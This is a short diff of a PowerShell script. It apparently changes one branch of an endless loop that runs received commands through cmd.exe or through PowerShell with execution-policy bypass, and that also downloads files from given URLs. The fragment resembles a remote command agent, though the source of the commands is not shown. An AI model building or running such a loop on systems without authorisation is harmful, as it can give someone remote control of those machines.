@@ -307,8 +307,8 @@ while ($true) {
                     Start-Process cmd.exe -ArgumentList "/c $command"
                 }
                 'PsCmd' {
-                    $psCommand = "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass; $command"
-                    Start-Process powershell.exe -ArgumentList "-NoExit, -NoProfile, -Command &{ $psCommand }"
+                    $psCommand = "powershell.exe -ExecutionPolicy Bypass -NoProfile -Command `"$command`""
+                    Start-Process cmd.exe -ArgumentList "/k $psCommand"
                 }
                 'Download' {
                     Download-File -url $command
